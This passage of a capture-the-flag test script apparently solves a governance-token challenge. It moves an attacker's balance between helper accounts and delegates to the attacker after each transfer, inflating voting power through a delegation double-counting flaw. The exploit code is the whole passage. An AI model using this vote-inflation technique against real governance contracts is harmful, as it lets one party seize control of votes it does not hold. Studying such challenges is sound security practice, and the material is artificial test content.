...
it("solves the challenge", async function () {
  let o1addr = await o1.getAddress();
  let o2addr = await o2.getAddress();
  let attackeraddr = await attacker.getAddress();
  let zeroaddr = await governanceToken.delegates(o1addr);
  let balance = await governanceToken.balanceOf(attackeraddr);

  await governanceToken.connect(attacker).transfer(o1addr, balance);
  await governanceToken.connect(o1).delegate(attackeraddr);
  await governanceToken.connect(o1).transfer(o2addr, balance);
  await governanceToken.connect(o2).delegate(attackeraddr);

  await governanceToken.connect(o2).transfer(o1addr, balance);
  await governanceToken.connect(o2).delegate(zeroaddr);
